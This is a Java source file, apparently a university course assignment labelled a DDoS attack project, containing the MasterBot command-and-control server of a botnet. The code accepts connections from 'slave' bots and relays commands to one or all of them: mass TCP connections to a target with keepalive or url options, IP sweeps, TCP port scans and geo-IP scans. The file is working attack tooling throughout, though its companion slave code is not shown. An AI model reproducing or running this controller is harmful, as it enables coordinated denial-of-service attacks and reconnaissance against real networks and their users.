/*@CMPE 206 DDOS attack under juan gomez
Contains MasterBot.java & SlaveBot.Java
By
Muralidhar Sri Ram 
San Jose Sate University
nagamuralidharsriram.boddapati@sjsu.edu*/

import java.io.IOException;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Scanner;

class Client_bridge 
{
	String Slave_address;
	String Slave_name;
	int Slave_port;
	Socket Slave_socket;
	String Host_address;
	String Host_name;
	int Host_port;
	Socket Host_socket;
	String date;
}

class SocketClientAccept implements Runnable {
	int Port;
	ServerSocket server_socket;

	SocketClientAccept(ServerSocket serversoc, int p) {
		Port = p;
		server_socket = serversoc;
	}

	public void run() {

		while (true) {
			Socket client_socket = null;
			Client_bridge clicon = new Client_bridge();
			try {
				client_socket = server_socket.accept();
				clicon.Slave_name = client_socket.getInetAddress().getHostName();
				clicon.Slave_address = client_socket.getInetAddress().getHostAddress();
				clicon.Slave_port = client_socket.getPort();
				clicon.Slave_socket = client_socket;
				clicon.date = new SimpleDateFormat("dd-MM-yyyy").format(Calendar.getInstance().getTime());
				MasterBot.clientList.add(clicon);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}


public class MasterBot {
	static int Port;
	public ServerSocket s1;
	public static ArrayList<Client_bridge> clientList = new ArrayList<Client_bridge>();
	static String in_Cmd;
	static int Connections_number;

	public static void main(String[] args) throws IOException {
		
		String cmd5 =  null;
		if (args.length < 2) {
			System.out.println("PLEASE GIVE PROPER ARGUMENTS");
			System.exit(0);
		}
		else if (args.length == 2) {
			if (args[0] != null && args[0].equals("-p")) {
				Port = Integer.parseInt(args[1]);
			}
			else {
				System.out.println("PLEASE GIVE PROPER ARGUMENTS");
				System.exit(0);
			}
		}
		ServerSocket server_socket = null;
		try {
			server_socket = new ServerSocket(Port);
		} catch (IOException e1) {
			e1.getMessage();
		}
		Thread t = new Thread(new SocketClientAccept(server_socket, Port), "Master Thread");
		t.start();
		while (true) {
			System.out.print(">");
			Scanner sc = new Scanner(System.in);
			in_Cmd = sc.nextLine();
			String[] cmd = in_Cmd.split(" ");
			
			switch(cmd[0]) {
			
			case "list" :
				for (int i = 0; i < clientList.size(); i++) {
					System.out.println("Address:" + clientList.get(i).Slave_name + " " + clientList.get(i).Slave_address
							+ " " + clientList.get(i).Slave_port + " " + clientList.get(i).date);
				}
				
				break;
		
			
			
			case "connect" : 
			
				if (cmd.length < 4) {
					System.out.println("Improper  connect arguments");
				} else 
				{
					if(cmd.length==4)
					{
						Connections_number = 1;
					}
					else if (cmd.length == 6) 
					{
						Connections_number = Integer.parseInt(cmd[4]);
						cmd5=cmd[5];
					} 
					else if (cmd.length==5)
					{
						if (cmd[4].matches("^[0-9]+$")) 
						{
							Connections_number = Integer.parseInt(cmd[4]);
						}
						else if (cmd[4].equalsIgnoreCase("keepalive")|| cmd[4].matches("^url=[^ ]+$") ) {
							Connections_number = 1;
							cmd5=cmd[4];
						} 
					}
					else
					{
						System.out.println("Improper connect argumnets ");
					}
					Iterator<Client_bridge> i = clientList.iterator();
					if (cmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) 
					{
						int found = 0;
						while (i.hasNext()) 
						{
							Client_bridge Client_Connectionbridge = i.next();
							
							if (Client_Connectionbridge.Slave_address.equals(cmd[1]))
							{
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								if(cmd5==null)
								{
									p.println("connect " + cmd[2] + " " + cmd[3] + " " + Connections_number );
									p.flush();
								}
								else
								{
										p.println("connect " + cmd[2] + " " + cmd[3] + " " + Connections_number + " " + cmd5);
										p.flush();
								}
							}
						}
						if (found == 0) {
							System.out.println("Slave address not found");
						}
					}

					else if (cmd[1].equals("all")) {
						while (i.hasNext()) {
							Client_bridge Client_Connectionbridge = i.next();
							PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
							if(cmd5==null)
							{
								p.println("connect " + cmd[2] + " " + cmd[3] + " " + Connections_number);
								p.flush();
							}
							else
							{						
								p.println("connect " + cmd[2] + " " + cmd[3] + " " + Connections_number + " " + cmd5);
								p.flush();
							}
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							Client_bridge Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_name.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								if(cmd5==null)
								{
									p.println("connect " + cmd[2] + " " + cmd[3] + " " + Connections_number);
									p.flush();
								}
								else
								{
									p.println("connect " + cmd[2] + " " + cmd[3] + " " + Connections_number + " " + cmd5);
									p.flush();
								}
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
				}
			
			break;
			case "disconnect":
				
				if (cmd.length < 3) {
					System.out.println("Incorrect disconnect cmd");
				}
				else {
					int target_port = 0;
					if (cmd.length > 3) {
						target_port = Integer.parseInt(cmd[3]);
					}
					Iterator<Client_bridge> i = clientList.iterator();
					if (cmd[1].matches(
							"^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) {
						int found = 0;
						while (i.hasNext()) {
							Client_bridge Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_address.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("disconnect " + cmd[2] + " " + target_port);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave address not found");
						}
					}
					else if (cmd[1].equals("all")) {
						while (i.hasNext()) {
							Client_bridge Client_Connectionbridge = i.next();
							PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
							p.println("disconnect " + cmd[2] + " " + target_port);
							p.flush();
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							Client_bridge Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_name.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("disconnect " + cmd[2] + " " + target_port);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
				}
			break;
			
			case "ipscan" :
			
				if (cmd.length < 3)
				{
					System.out.println("Incorrect ipscan cmd");
				}
				else
				{
					Iterator<Client_bridge> i = clientList.iterator();
					Client_bridge Client_Connectionbridge =null;
					if (cmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) 
					{
						int found = 0;
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_address.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("ipscan " + cmd[2]);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Error : Salve not found");
						}
					}
					else if (cmd[1].equals("all")) {
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
							p.println("ipscan " + cmd[2]);
							p.flush();
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_name.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("ipscan " + cmd[2]);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
					
                    final Client_bridge clicon2=Client_Connectionbridge;
					
					Thread thread1 = new Thread()
		            {
						public void run()
						{
							Scanner sc1;
							try {
								sc1 = new Scanner(clicon2.Slave_socket.getInputStream());
								String ListOfIpAddresses = sc1.nextLine();
								// System.out.println(ListOfIpAddresses);
								System.out.println(ListOfIpAddresses + "\n");
							} catch (IOException e) {
								
								e.printStackTrace();
							}
							
						}
				    };
				    
				    thread1.start();
				}
			
			break;
			case "tcpportscan":
			
				if (cmd.length < 4)
				{
					System.out.println("Incorrect tcpportscan cmd");
				}
				else
				{
					Iterator<Client_bridge> i = clientList.iterator();
					Client_bridge Client_Connectionbridge =null;
					
					
					if (cmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) 
					{
						int found = 0;
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_address.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("tcpportscan " + cmd[2] + " " + cmd[3]);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave address not found");
						}
					}
					else if (cmd[1].equals("all")) {
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
							p.println("tcpportscan " + cmd[2] + " " + cmd[3]);
							p.flush();
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_name.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("tcpportscan " + cmd[2] + " " + cmd[3]);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
					final Client_bridge clicon2=Client_Connectionbridge;
					
					Thread thread1 = new Thread()
		            {
						public void run()
						{
							Scanner sc1;
							try {
								sc1 = new Scanner(clicon2.Slave_socket.getInputStream());
								String ListOfTargetPorts = sc1.nextLine();
								// System.out.println(ListOfTargetPorts);
								System.out.println(ListOfTargetPorts + "\n");
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							
						}
				    };
				    
				    thread1.start();
					
					
				
				}
			
			break;
			case "geoipscan" :
			if (cmd.length < 3)
				{
					System.out.println("Incorrect geoipscan cmd");
				}
				else
				{
					Iterator<Client_bridge> i = clientList.iterator();
					Client_bridge Client_Connectionbridge =null;
					if (cmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) 
					{
						int found = 0;
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_address.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("geoipscan " + cmd[2]);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave address not found");
						}
					}
					else if (cmd[1].equals("all")) {
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
							p.println("geoipscan " + cmd[2]);
							p.flush();
						}
					}
					else {
						int found = 0;
						while (i.hasNext()) {
							 Client_Connectionbridge = i.next();
							if (Client_Connectionbridge.Slave_name.equals(cmd[1])) {
								found = 1;
								PrintStream p = new PrintStream(Client_Connectionbridge.Slave_socket.getOutputStream());
								p.println("geoipscan " + cmd[2]);
								p.flush();
							}
						}
						if (found == 0) {
							System.out.println("Slave name not found");
						}
					}
					
                    final Client_bridge clicon2=Client_Connectionbridge;
					
					Thread thread1 = new Thread()
		            {
						public void run()
						{
							Scanner sc1;
							try {
								sc1 = new Scanner(clicon2.Slave_socket.getInputStream());
								while(true)
								{
								String GeoipscanList = sc1.nextLine();
								// System.out.println(ListOfIpAddresses);
								System.out.println(GeoipscanList );
								}
							} catch (IOException e) {
								
								e.printStackTrace();
							}
							
						}
						
				    };
				    
				    thread1.start();
				}
			
			break ;
			}
		}
	}
}